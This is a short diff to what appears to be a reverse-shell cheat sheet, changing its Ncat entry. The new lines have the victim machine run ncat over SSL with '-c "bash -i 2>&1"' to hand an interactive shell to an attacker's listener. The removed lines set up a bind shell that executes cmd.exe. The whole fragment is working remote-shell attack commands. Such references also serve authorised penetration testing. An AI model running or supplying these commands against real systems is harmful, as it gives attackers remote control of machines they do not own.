@@ -213,8 +213,8 @@ p.waitFor()
 ## Ncat
 
 ```bash
-victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
-attacker> ncat -v 10.0.0.22 4444 --ssl
+victim> ncat <ip> <port,eg.443> --ssl  -c  "bash -i 2>&1"
+attacker> ncat -l <port,eg.443> --ssl
 ```
 
 ## Golang
